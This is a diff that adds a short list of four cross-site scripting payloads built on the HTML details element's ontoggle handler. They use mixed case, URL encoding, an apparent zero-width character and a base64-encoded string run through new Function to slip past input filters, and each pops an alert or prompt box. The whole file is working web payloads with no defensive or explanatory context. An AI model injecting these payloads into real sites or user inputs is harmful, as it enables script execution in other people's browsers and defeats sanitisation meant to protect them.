@@ -1,0 +1,4 @@
+#1 :<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+#2 :<details%20open%20ontoggle="a%3Dalert;%20a(%27XSS%20Payload%20Triggered%27);">
+#3 : <details open ontoggle​="a%3Dalert; a('subhashis360');">
+#4 : <details open ontoggle​="(new Function(atob('YWxlcnQoJ1hTUyBQYXlsb2FkIFRyaWdnZXJlZCcp'))())">
